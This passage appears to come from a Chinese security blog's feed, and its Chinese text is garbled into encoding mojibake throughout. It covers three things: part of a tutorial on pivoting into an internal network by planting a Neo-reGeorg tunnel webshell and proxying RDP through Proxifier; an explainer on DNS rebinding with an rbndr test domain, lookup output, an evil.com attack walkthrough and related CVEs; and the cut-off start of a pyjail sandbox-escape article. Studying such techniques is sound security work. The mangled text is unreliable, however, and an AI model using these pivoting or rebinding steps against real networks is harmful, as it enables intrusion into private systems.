<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421170513920.png" alt="image-20230421170513920"></p>
<h4 id="2-å†…ç½‘ä»£ç†ä¸»æœºé…ç½®"><a class="markdownIt-Anchor" href="#2-å†…ç½‘ä»£ç†ä¸»æœºé…ç½®"></a> 2ã€å†…ç½‘ä»£ç†ä¸»æœºé…ç½®</h4>
<p>è¿™éœ€è¦åœ¨å†…ç½‘ä¸»æœºä¸­è€ƒè™‘å¯åŠ¨ä¸€ä¸ªwebæœåŠ¡ï¼Œæˆ‘è¿™é‡Œç›´æ¥å®‰è£…phpstudyï¼Œè¯¦ç»†å®‰è£…ä½¿ç”¨æ•™ç¨‹è¯·è‡ªè¡Œgoogleï¼Œå½“ç„¶å…¶ä»–çš„æ–¹æ³•ä¹Ÿå¯ä»¥ã€‚åªè¦èƒ½å¯åŠ¨webæœåŠ¡ç”¨äºä¸Šä¼ tunnel.phpæ–‡ä»¶å°±è¡Œã€‚</p>
<p>è®¿é—®ä¸Šä¼ æˆåŠŸçš„tunnel.php:</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421173359868.png" alt="image-20230421173359868"></p>
<p>ç›´æ¥å°†ç”Ÿæˆçš„webshellè„šæœ¬æ”¾åˆ°phpstudyçš„æ ¹ç›®å½•å³å¯ï¼Œæˆ‘è¿™é‡Œæ›´æ”¹äº†ä¸€ä¸‹webshellç»™çš„è®¿é—®æˆåŠŸçš„è¾“å‡ºã€‚</p>
<h4 id="3-é…ç½®æ¸—é€ä¸»æœºä»£ç†è§„åˆ™profile-proxification-rules"><a class="markdownIt-Anchor" href="#3-é…ç½®æ¸—é€ä¸»æœºä»£ç†è§„åˆ™profile-proxification-rules"></a> 3ã€é…ç½®æ¸—é€ä¸»æœºä»£ç†è§„åˆ™ï¼š<code>Profile-proxification Rules</code></h4>
<p>ä»£ç†è§„åˆ™å…¶å®å°±ç›¸å½“äºæŒ‡å®šé‚£ä¸ªè½¯ä»¶çš„æµé‡ç»è¿‡ä»£ç†ï¼Œå“ªäº›ä¸ç»è¿‡ä»£ç†ï¼Œä¸€èˆ¬æƒ…å†µä¸‹æˆ‘ä»¬éœ€è¦ä½¿ç”¨æµè§ˆå™¨è®¿é—®å†…ç½‘çš„ç½‘é¡µï¼Œæ‰€ä»¥å°±éœ€è¦ç»™æµè§ˆå™¨é…ç½®ç»è¿‡ä»£ç†ï¼Œå…¶ä»–ä¸éœ€è¦ä»£ç†çš„è½¯ä»¶å°±è¿™è®¾ä¸ºdirectæ¨¡å¼ï¼ˆä¸ç»è¿‡ä»£ç†ï¼‰</p>
<p>127.0.0.1 ä¸ºsocks5 ï¼Œpythonè„šæœ¬ä¸ºdirect</p>
<h4 id="3-æµé‡äº’é€š"><a class="markdownIt-Anchor" href="#3-æµé‡äº’é€š"></a> 3ã€æµé‡äº’é€š</h4>
<p><a href="http://xn--neoreg-2y7im02o05mm1tsw8bw3sqxa.py">è¿è¡Œæ¸—é€ä¸»æœºçš„neoreg.py</a><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230421201640081.png" alt="image-20230421201640081"></p>
<p>è¿™é‡Œéœ€è¦è®¾ç½®ä¸€ä¸‹æ¸—é€ä¸»æœºçš„ä»£ç†ï¼Œä½¿ç”¨Proxifierä»£ç†ï¼š</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88%E5%A6%82%E4%BD%95%E5%88%A9%E7%94%A8Neo-reGeorg+Proxifier%E5%81%9A%E8%B7%B3%E6%9D%BF%E6%9C%BA/image-20230425020828636.png" alt="image-20230425020828636"></p>
<p>è®¾ç½®1080ç«¯å£ã€‚</p>
<h3 id="é€šè¿‡ä»£ç†è¿æ¥ç›®æ ‡ä¸»æœº3389ç«¯å£"><a class="markdownIt-Anchor" href="#é€šè¿‡ä»£ç†è¿æ¥ç›®æ ‡ä¸»æœº3389ç«¯å£"></a> é€šè¿‡ä»£ç†ï¼Œè¿æ¥ç›®æ ‡ä¸»æœº3389ç«¯å£</h3>
<h4 id="1-è¿œç¨‹æ¡Œé¢ç™»å½•"><a class="markdownIt-Anchor" href="#1-è¿œç¨‹æ¡Œé¢ç™»å½•"></a> 1ã€è¿œç¨‹æ¡Œé¢ç™»å½•ã€‚</h4>
<p>æ‰“å¼€æœ¬åœ°è¿œç¨‹æ¡Œé¢ï¼Œå³å‡»mstsc.exeç”¨Proxifierä¸­çš„<code>Proxy SOCKS 5 127.0.0.1</code>æ‰“å¼€ã€‚</p>
]]></content>
      <categories>
        <category>æ¸—é€å­¦ä¹ </category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯å­¦ä¹ </tag>
        <tag>æ¸—é€</tag>
        <tag>ä»£ç†</tag>
        <tag>å†…ç½‘</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…è°ˆDNS Rebinding</title>
    <url>/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/</url>
    <content><![CDATA[<p>ä¸ºå•¥çªç„¶è¦æ€»ç»“ä¸€ä¸‹è¿™ä¸ªå¾ˆè€çš„çŸ¥è¯†ç‚¹ï¼Œæˆ‘ä¹Ÿä¸çŸ¥é“ï¼Œå¯èƒ½å¤ªèœäº†ï¼Œé—²ä¸‹æ¥æ€»å¾—å­¦ç‚¹ä»€ä¹ˆ~</p>
<span id="more"></span>
<h1 id="dns-rebinding"><a class="markdownIt-Anchor" href="#dns-rebinding"></a> DNS Rebinding</h1>
<h2 id="0x01-æ”»å‡»ç®€ä»‹"><a class="markdownIt-Anchor" href="#0x01-æ”»å‡»ç®€ä»‹"></a> 0x01 æ”»å‡»ç®€ä»‹</h2>
<p><strong>DNS Rebinding</strong>ä¹Ÿå«åšDNSé‡ç»‘å®šæ”»å‡»æˆ–è€…DNSé‡å®šå‘æ”»å‡»ã€‚åœ¨è¿™ç§æ”»å‡»ä¸­ï¼Œæ¶æ„ç½‘é¡µä¼šå¯¼è‡´è®¿é—®è€…è¿è¡Œå®¢æˆ·ç«¯è„šæœ¬ï¼Œæ”»å‡»ç½‘ç»œä¸Šå…¶ä»–åœ°æ–¹çš„è®¡ç®—æœºã€‚</p>
<p>åœ¨ä»‹ç»DNS Rebindingæ”»å‡»æœºåˆ¶ä¹‹å‰æˆ‘ä»¬å…ˆäº†è§£ä¸€ä¸‹WebåŒæºç­–ç•¥ï¼Œ</p>
<h3 id="webåŒæºç­–ç•¥"><a class="markdownIt-Anchor" href="#webåŒæºç­–ç•¥"></a> WebåŒæºç­–ç•¥</h3>
<p><strong>åŒæºç­–ç•¥</strong>ï¼ˆè‹±è¯­ï¼šSame-origin policyï¼‰æ˜¯æŒ‡åœ¨Webæµè§ˆå™¨ä¸­ï¼Œå…è®¸æŸä¸ªç½‘é¡µè„šæœ¬è®¿é—®å¦ä¸€ä¸ªç½‘é¡µçš„æ•°æ®ï¼Œä½†å‰ææ˜¯è¿™ä¸¤ä¸ªç½‘é¡µå¿…é¡»æœ‰ç›¸åŒçš„URLã€ä¸»æœºåå’Œç«¯å£å·ï¼Œä¸€æ—¦ä¸¤ä¸ªç½‘ç«™æ»¡è¶³ä¸Šè¿°æ¡ä»¶ï¼Œè¿™ä¸¤ä¸ªç½‘ç«™å°±è¢«è®¤å®šä¸ºå…·æœ‰ç›¸åŒæ¥æºã€‚æ­¤ç­–ç•¥å¯é˜²æ­¢æŸä¸ªç½‘é¡µä¸Šçš„æ¶æ„è„šæœ¬é€šè¿‡è¯¥é¡µé¢çš„æ–‡æ¡£å¯¹è±¡æ¨¡å‹è®¿é—®å¦ä¸€ç½‘é¡µä¸Šçš„æ•æ„Ÿæ•°æ®ï¼Œæ¯”å¦‚<code>XSSï¼ŒXXEï¼ŒSSRF</code>ç­‰åŸºäºç½‘é¡µä¸Šçš„æ¶æ„è„šæœ¬æ”»å‡»ã€‚</p>
<p>**åŒæºçš„å®šä¹‰ï¼š**å¦‚æœä¸¤ä¸ª URL çš„ åè®®ã€åŸŸåã€ç«¯å£éƒ½ç›¸åŒçš„è¯ï¼Œåˆ™è¿™ä¸¤ä¸ª URL æ˜¯<em>åŒæº</em>ã€‚</p>
<p>åŒæºç­–ç•¥å¯¹Webåº”ç”¨ç¨‹åºå…·æœ‰ç‰¹æ®Šæ„ä¹‰ï¼Œå› ä¸ºWebåº”ç”¨ç¨‹åºå¹¿æ³›ä¾èµ–äºHTTP cookieæ¥ç»´æŒç”¨æˆ·ä¼šè¯(session)ï¼Œæ‰€ä»¥å¿…é¡»å°†ä¸ç›¸å…³ç½‘ç«™ä¸¥æ ¼åˆ†éš”ï¼Œä»¥é˜²æ­¢ä¸¢å¤±æ•°æ®æ³„éœ²ã€‚</p>
<p>å€¼å¾—æ³¨æ„çš„æ˜¯åŒæºç­–ç•¥ä»…é€‚ç”¨äºè„šæœ¬ï¼Œè¿™æ„å‘³ç€æŸç½‘ç«™å¯ä»¥é€šè¿‡ç›¸åº”çš„HTMLæ ‡ç­¾è®¿é—®ä¸åŒæ¥æºç½‘ç«™ä¸Šçš„å›¾åƒã€CSSå’ŒåŠ¨æ€åŠ è½½ è„šæœ¬ç­‰èµ„æºã€‚è€Œè·¨ç«™è¯·æ±‚ä¼ªé€ (CSRF)å°±æ˜¯åˆ©ç”¨åŒæºç­–ç•¥ä¸é€‚ç”¨äºHTMLæ ‡ç­¾çš„ç¼ºé™·ã€‚</p>
<p><strong>æ‰€ä»¥ä»ç†è®ºä¸Šæ¥è®²ï¼ŒåŒæºç­–ç•¥æ˜¯èƒ½å¤Ÿæœ‰æ•ˆçš„ä¿è¯ï¼šå®¢æˆ·ç«¯è„šæœ¬åªèƒ½è®¿é—®ä¸ºè„šæœ¬æä¾›æœåŠ¡çš„åŒä¸€ä¸»æœºä¸Šçš„å†…å®¹ã€‚</strong></p>
<p>è‡³æ­¤å¦‚ä½•ç»•è¿‡WebåŒæºç­–ç•¥ä¹Ÿæˆäº†ä¼—å¤šhackerç ”ç©¶çš„åœ°æ–¹ã€‚</p>
<h2 id="0x02-æ”»å‡»åŸç†"><a class="markdownIt-Anchor" href="#0x02-æ”»å‡»åŸç†"></a> 0x02 æ”»å‡»åŸç†ï¼š</h2>
<p>è¿™é‡Œè¯´ä¸€ä¸‹åˆ©ç”¨çš„TTLæ˜¯ä»€ä¹ˆï¼š</p>
<blockquote>
<p>TTLæ˜¯è‹±è¯­Time-To-Liveçš„ç®€ç§°ï¼Œæ„æ€ä¸ºä¸€æ¡åŸŸåè§£æè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸­çš„å­˜ç•™æ—¶é—´ã€‚å½“å„åœ°çš„DNSæœåŠ¡å™¨æ¥å—åˆ°è§£æè¯·æ±‚æ—¶ï¼Œå°±ä¼šå‘åŸŸåæŒ‡å®šçš„NSæœåŠ¡å™¨å‘å‡ºè§£æè¯·æ±‚ä»è€Œè·å¾—è§£æè®°å½•ï¼›åœ¨è·å¾—è¿™ä¸ªè®°å½•ä¹‹åï¼Œè®°å½•ä¼šåœ¨DNSæœåŠ¡å™¨ä¸­ä¿å­˜ä¸€æ®µæ—¶é—´ï¼Œè¿™æ®µæ—¶é—´å†…å¦‚æœå†æ¥åˆ°è¿™ä¸ªåŸŸåçš„è§£æè¯·æ±‚ï¼ŒDNSæœåŠ¡å™¨å°†ä¸å†å‘NSæœåŠ¡å™¨å‘å‡ºè¯·æ±‚ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›åˆšæ‰è·å¾—çš„è®°å½•ï¼›è€Œè¿™ä¸ªè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šä¿ç•™çš„æ—¶é—´ï¼Œå°±æ˜¯TTLå€¼ã€‚</p>
</blockquote>
<p><strong>å³TTLçš„æ•°å€¼è¶Šå°ï¼Œä¿®æ”¹è®°å½•åæ‰€å—çš„å½±å“ç”Ÿæ•ˆè¶Šå¿«ã€‚</strong></p>
<p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥æ¥æ„é€ ä¸€ä¸ªDNS é‡ç»‘å®šçš„æ¡ˆä¾‹ï¼š</p>
<p>ä¾‹å¦‚ï¼Œè¦åœ¨192.168.32.10å’Œ127.0.0.1ä¹‹é—´åˆ‡æ¢ï¼Œæˆ‘ä»¬å¯ä»¥å°†ä»–ä»¬ç¼–ç ä¸ºdwordsï¼Œä½¿ç”¨<a href="https://lock.cmpxchg8b.com/rebinder.html">rbndr</a>å·¥å…·ï¼š</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="number">7</span>f000001<span class="selector-class">.c0a8200a</span><span class="selector-class">.rbndr</span>.us</span><br></pre></td></tr></table></figure>
<p>æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æµ‹è¯•ä¸€ä¸‹ï¼š</p>
<figure class="highlight dns"><table><tr><td class="code"><pre><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">192.168.32.10</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">192.168.32.10</span></span><br><span class="line"># host <span class="number">7f000001</span>.c0a8200a.rbndr.us</span><br><span class="line"><span class="number">7f000001</span>.c0a8200a.rbndr.us has address <span class="number">127.0.0.1</span>                                                   </span><br></pre></td></tr></table></figure>
<p>ç”±æ­¤å°±è¾¾åˆ°äº†ä¸€ä¸ªDNS é‡ç»‘å®šçš„æ•ˆæœã€‚</p>
<h2 id="0x03-æ”»å‡»æœºåˆ¶"><a class="markdownIt-Anchor" href="#0x03-æ”»å‡»æœºåˆ¶"></a> 0x03 æ”»å‡»æœºåˆ¶</h2>
<p>æ”»å‡»è€…æ— æ³•æ§åˆ¶åç§°æœåŠ¡å™¨çš„è½½ä½“ï¼Œæ‰€æœ‰è§£æä¸»æœºåï¼ˆæˆ– IP åœ°å€ï¼Œä»ç„¶æ˜¯æœ‰æ•ˆä¸»æœºåï¼‰çš„è¯·æ±‚éƒ½è¢«é‡å®šå‘åˆ°ç”±æ”»å‡»è€…æ§åˆ¶å’Œæ“ä½œçš„å¤‡ç”¨åç§°æœåŠ¡å™¨ã€‚ä¾‹å¦‚ï¼Œå¦‚æœæˆ‘ä»¬æœ‰ä¸€ä¸ªç½‘å€ä¸º <a href="http://www.example-a.com">www.example-a.com</a> çš„ç½‘ç«™ï¼Œå¹¶ä¸”æˆ‘ä»¬æƒ³è¦è®¿é—®ç§æœ‰å†…éƒ¨åŸŸé‚®ä»¶æœåŠ¡å™¨æˆ–åªèƒ½é€šè¿‡è¯¥ç‰¹å®šç§æœ‰ IP åœ°å€è®¿é—®çš„å…¶ä»–æœåŠ¡ï¼Œåˆ™å¯ä»¥ä½¿ç”¨ DNS é‡æ–°ç»‘å®šæ”»å‡»æ¥ä¼ªé€ è¿™äº›åœ°å€ä¹‹ä¸€ã€‚</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/image-20230404221756020.png" alt="image-20230404221756020"></p>
<h2 id="0x04-æ”»å‡»ç¤ºä¾‹"><a class="markdownIt-Anchor" href="#0x04-æ”»å‡»ç¤ºä¾‹"></a> 0x04 æ”»å‡»ç¤ºä¾‹</h2>
<ol>
<li>æ”»å‡»è€…æ³¨å†Œä¸€ä¸ªåŸŸåï¼Œä¾‹å¦‚ IP åœ°å€ä¸º 1.3.5.7 çš„ <a href="http://www.evil.com">www.evil.com</a>ï¼Œå°†å…¶å§”æ‰˜ç»™è‡ªå·±çš„ DNS æœåŠ¡å™¨ï¼ˆ1.3.5.4ï¼‰ï¼Œå¹¶ä½¿ç”¨é’“é±¼é“¾æ¥æˆ–ç”µå­é‚®ä»¶è·å– HTTP æµé‡ã€‚</li>
<li>DNS æœåŠ¡å™¨æ²¡æœ‰å‘é€æ­£å¸¸çš„ TTL è®°å½•ï¼Œè€Œæ˜¯å‘é€äº†ä¸€ä¸ªéå¸¸çŸ­çš„ TTL è®°å½•ï¼ˆä¾‹å¦‚ï¼Œ1 ç§’ï¼‰ï¼Œé˜²æ­¢æ¡ç›® [<a href="http://www.evil.com">www.evil.com</a>, 1.3.5.7] çš„ DNS å“åº”è¢«ç¼“å­˜åœ¨å—å®³è€…çš„ï¼ˆ192.168.1.10 ) æµè§ˆå™¨ã€‚</li>
<li>å¯¹æ‰‹çš„æœåŠ¡å™¨é¦–å…ˆç”¨åŒ…å«æœåŠ¡å™¨ IP åœ°å€ (1.3.5.7) çš„<code>JavaScript</code> ç­‰æ¶æ„è„šæœ¬å“åº”å—å®³è€…ã€‚</li>
<li>å¯¹æ‰‹ä½¿ç”¨ <code>XMLHttpRequest (XHR)</code> å°† HTTP è¯·æ±‚æˆ– HTTPS è¯·æ±‚ç›´æ¥å‘é€åˆ°å¯¹æ‰‹çš„æœåŠ¡å™¨å¹¶åŠ è½½å“åº”ã€‚</li>
<li>æ¶æ„è„šæœ¬å…è®¸å¯¹æ‰‹å°†ä¸»æœºåé‡æ–°ç»‘å®šåˆ°é˜²ç«å¢™åé¢çš„ç›®æ ‡æœåŠ¡å™¨çš„ IP åœ°å€ (192.168.1.2)ã€‚</li>
<li>ç„¶åæœåŠ¡å™¨å“åº”å¯¹æ‰‹çš„çœŸå®ç›®æ ‡ï¼Œå³ä¸å—å®³è€…ï¼ˆ192.168.1.10ï¼‰åŒåŸŸçš„å†…éƒ¨ä¸»æœºIPï¼ˆ192.168.1.2ï¼‰ã€‚</li>
<li>ç”±äºåŒä¸€ä¸ªåç§°è§£æä¸ºè¿™ä¸¤ä¸ª IP åœ°å€ï¼Œæµè§ˆå™¨ä¼šå°†è¿™ä¸¤ä¸ª IP åœ°å€ï¼ˆ1.3.5.7 å’Œ 192.168.1.2ï¼‰ç½®äºåŒä¸€å®‰å…¨åŒºåŸŸå¹¶å…è®¸ä¿¡æ¯åœ¨åœ°å€ä¹‹é—´æµåŠ¨ã€‚</li>
<li>æ­¤å¤–ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡å‘é€å¤šä¸ªçŸ­æœŸIPåœ°å€æ¥å®ç°æ‰«æå’Œè®¿é—®å—å®³è€…æœ¬åœ°ç½‘ç»œï¼ˆ192.168.XXï¼‰ä¸­çš„æ‰€æœ‰å†…éƒ¨ä¸»æœºã€‚</li>
</ol>
<h2 id="0x05-æ”»å‡»å±å®³"><a class="markdownIt-Anchor" href="#0x05-æ”»å‡»å±å®³"></a> 0x05 æ”»å‡»å±å®³</h2>
<p>DNS Rebindingå¯ä»¥é€šè¿‡è®©å—å®³è€…çš„Webæµè§ˆå™¨è®¿é—®ä¸“ç”¨IPåœ°å€çš„æœºå™¨å¹¶å°†ç»“æœè¿”å›ç»™æ”»å‡»è€…æ¥ç ´åä¸“ç”¨ç½‘ç»œã€‚ å®ƒä¹Ÿå¯ä»¥ç”¨äºä½¿ç”¨å—å®³è€…æœºå™¨å‘é€åƒåœ¾é‚®ä»¶ï¼Œåˆ†å¸ƒå¼æ‹’ç»æœåŠ¡æ”»å‡»ï¼ˆDDOSï¼‰æˆ–å…¶ä»–æ¶æ„æ´»åŠ¨ï¼Œä¹Ÿå°±æ˜¯æˆ‘ä»¬å¸¸å¬è¯´çš„è‚‰æœºå’Œåƒµå°¸æœºã€‚</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/DDOS.png" alt="DDOS"></p>
<h3 id="0x04-1-é€šè¿‡-dns-é‡æ–°ç»‘å®šæ”»å‡»è¿›è¡Œç½‘ç»œæ¸—é€æµ‹è¯•"><a class="markdownIt-Anchor" href="#0x04-1-é€šè¿‡-dns-é‡æ–°ç»‘å®šæ”»å‡»è¿›è¡Œç½‘ç»œæ¸—é€æµ‹è¯•"></a> 0x04-1 é€šè¿‡ DNS é‡æ–°ç»‘å®šæ”»å‡»è¿›è¡Œç½‘ç»œæ¸—é€æµ‹è¯•ï¼š</h3>
<p>åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œç”¨æˆ·ä¼šè¢«è¯±éª—ä½¿ç”¨è¿™äº›ç½‘ï¼ˆä¾‹å¦‚ï¼Œç§äººç”µå­é‚®ä»¶æœåŠ¡å™¨ï¼‰åˆ›å»ºç½‘ç»œé’“é±¼ç½‘ç«™ã€‚ç”±äºå‘é€åˆ°è¢«åŠ«æŒ URL çš„æ‰€æœ‰æµé‡ç°åœ¨éƒ½è¢«å‘é€å›åŸå§‹æœåŠ¡å™¨ï¼Œå› æ­¤å®ƒå˜å¾—å®Œå…¨æ··ä¹±å¹¶è¿«ä½¿ç”¨æˆ·å®‰è£…ç½‘ç»œé’“é±¼é¡µé¢ã€‚ ä»¥æ­¤æ¥è¾¾åˆ°è·å–ç”¨æˆ·ä¿¡æ¯æˆ–è€…æ˜¯ç”¨æˆ·æƒé™çš„ä½œç”¨ã€‚</p>
<p><img src="/2023/04/%E6%B5%85%E8%B0%88DNS-rebinding/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220923151414-1024x576.jpg" alt="ç½‘ç»œé’“é±¼"></p>
<h2 id="0x06-å°†dns-rebindingåº”ç”¨åˆ°å®é™…æ¼æ´æŒ–æ˜"><a class="markdownIt-Anchor" href="#0x06-å°†dns-rebindingåº”ç”¨åˆ°å®é™…æ¼æ´æŒ–æ˜"></a> 0x06 å°†DNS Rebindingåº”ç”¨åˆ°å®é™…æ¼æ´æŒ–æ˜</h2>
<h3 id="cve-2022-4096"><a class="markdownIt-Anchor" href="#cve-2022-4096"></a> <a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096">CVE-2022-4096</a></h3>
<blockquote>
<p>æ¼æ´æè¿°ï¼š1.8.2 ä¹‹å‰çš„ GitHub å­˜å‚¨åº“ appsmithorg/appsmith ä¸­çš„æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (SSRF)</p>
<p>å¤ç°é“¾æ¥ï¼š<a href="https://infosecwriteups.com/ssrf-via-dns-rebinding-cve-2022-4096-b7bf75928bb2">https://infosecwriteups.com/ssrf-via-dns-rebinding-cve-2022-4096-b7bf75928bb2</a></p>
</blockquote>
<h3 id="cve-2023-26492"><a class="markdownIt-Anchor" href="#cve-2023-26492"></a> CVE-2023-26492</h3>
<blockquote>
<p>æ¼æ´æè¿°ï¼šDirectus æ˜¯ç”¨äºç®¡ç† SQL æ•°æ®åº“å†…å®¹çš„å®æ—¶ API å’Œåº”ç”¨ç¨‹åºä»ªè¡¨æ¿ã€‚å½“ä»è¿œç¨‹ Web æœåŠ¡å™¨å¯¼å…¥æ–‡ä»¶ï¼ˆPOST åˆ° <code>/files/import</code>ï¼‰æ—¶ï¼ŒDirectus å®¹æ˜“å—åˆ°æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€  (SSRF) çš„æ”»å‡»ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡æ‰§è¡Œ DNS é‡æ–°ç»‘å®šæ”»å‡»å¹¶æŸ¥çœ‹æ¥è‡ªå†…éƒ¨æœåŠ¡å™¨çš„æ•æ„Ÿæ•°æ®æˆ–æ‰§è¡Œæœ¬åœ°ç«¯å£æ‰«ææ¥ç»•è¿‡å®‰å…¨æ§åˆ¶ã€‚æ”»å‡»è€…å¯ä»¥åˆ©ç”¨æ­¤æ¼æ´è®¿é—®é«˜åº¦æ•æ„Ÿçš„å†…éƒ¨æœåŠ¡å™¨å¹¶çªƒå–æ•æ„Ÿä¿¡æ¯ã€‚æ­¤é—®é¢˜å·²åœ¨ç‰ˆæœ¬ 9.23.0 ä¸­ä¿®å¤ã€‚</p>
<p>CVEé“¾æ¥ï¼š<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26492">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26492</a></p>
</blockquote>
<h3 id="cve-2022-43548"><a class="markdownIt-Anchor" href="#cve-2022-43548"></a> CVE-2022-43548</h3>
<blockquote>
<p>æ¼æ´æè¿°ï¼šç”±äº IsAllowedHost æ£€æŸ¥ä¸å……åˆ†ï¼ŒNode.js ç‰ˆæœ¬ &lt;14.21.1ã€&lt;16.18.1ã€&lt;18.12.1ã€&lt;19.0.1 ä¸­å­˜åœ¨æ“ä½œç³»ç»Ÿå‘½ä»¤æ³¨å…¥æ¼æ´ï¼Œè¯¥æ¼æ´å¾ˆå®¹æ˜“è¢«ç»•è¿‡ï¼Œå› ä¸º IsIPAddress æ²¡æœ‰æ­£ç¡®æ£€æŸ¥ IPåœ¨å‘å‡ºå…è®¸é‡æ–°ç»‘å®šæ”»å‡»çš„ DBS è¯·æ±‚ä¹‹å‰åœ°å€æ— æ•ˆã€‚<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-32212</a> ä¸­é’ˆå¯¹æ­¤é—®é¢˜çš„ä¿®å¤ä¸å®Œæ•´ï¼Œè¿™ä¸ªæ–°çš„ CVE æ˜¯ä¸ºäº†å®Œæˆä¿®å¤ã€‚</p>
<p>CVEé“¾æ¥ï¼š<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-43548</a></p>
</blockquote>
<p>é’ˆå¯¹<code>CVE-2022-43548</code>å’Œ<code>CVE-2023-26492</code>åç»­ä¼šæœ‰å®Œæ•´çš„å¤ç°è¿‡ç¨‹æ–‡ç« ï¼ŒæœŸå¾…ä¸€ä¸‹~</p>
<h2 id="0x07-å‚è€ƒé“¾æ¥"><a class="markdownIt-Anchor" href="#0x07-å‚è€ƒé“¾æ¥"></a> 0x07 å‚è€ƒé“¾æ¥</h2>
<blockquote>
<p>[WebåŒæºç­–ç•¥] <a href="https://zh.wikipedia.org/wiki/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5">https://zh.wikipedia.org/wiki/åŒæºç­–ç•¥</a>)</p>
<p>[DNS Rebinding] (<a href="https://en.wikipedia.org/wiki/DNS_rebinding">https://en.wikipedia.org/wiki/DNS_rebinding</a>)</p>
<p>[CVE-2022-4096] (<a href="https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-4096</a>)</p>
<p>[DNS Rebinding Attacks Explained]  (<a href="https://danielmiessler.com/blog/dns-rebinding-explained/">https://danielmiessler.com/blog/dns-rebinding-explained/</a>)</p>
</blockquote>
]]></content>
      <categories>
        <category>æŠ€æœ¯åˆ†äº«</category>
      </categories>
      <tags>
        <tag>DNS rebinding</tag>
      </tags>
  </entry>
  <entry>
    <title>pyjail-å­¦ä¹ æ€»ç»“ã€CVã€‘</title>
    <url>/2023/02/pyjail-%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93%E3%80%90CV%E3%80%91/</url>
    <content><![CDATA[<p>01ã€ä»€ä¹ˆæ˜¯pyjailï¼Ÿ02ã€æ€ä¹ˆå­¦pyjailï¼Ÿ03ã€å»å“ªå­¦pyjailï¼Ÿ</p>
<span id="more"></span>
<h1 id="pyjail-å­¦ä¹ æ€»ç»“cv"><a class="markdownIt-Anchor" href="#pyjail-å­¦ä¹ æ€»ç»“cv"></a> pyjail-å­¦ä¹ æ€»ç»“ã€CVã€‘</h1>
<h2 id="çµé­‚ä¸‰é—®"><a class="markdownIt-Anchor" href="#çµé­‚ä¸‰é—®"></a> çµé­‚ä¸‰é—®</h2>
<h3 id="ä»€ä¹ˆæ˜¯pyjail"><a class="markdownIt-Anchor" href="#ä»€ä¹ˆæ˜¯pyjail"></a> ä»€ä¹ˆæ˜¯pyjailï¼Ÿ</h3>
<p>pyjailä¹Ÿå«<strong>æ²™ç®±é€ƒé€¸</strong>,å°±æ˜¯åœ¨ä¸€ä¸ªå—é™åˆ¶çš„pythonç¯å¢ƒä¸­,ç»•è¿‡ç°åœ¨å’Œè¿‡æ»¤è¾¾åˆ°æ›´é«˜æƒé™,æˆ–è€…geshellçš„è¿‡ç¨‹ã€‚</p>
<h3 id="æ€ä¹ˆå­¦pyjail"><a class="markdownIt-Anchor" href="#æ€ä¹ˆå­¦pyjail"></a> æ€ä¹ˆå­¦pyjailï¼Ÿ</h3>
<ol>
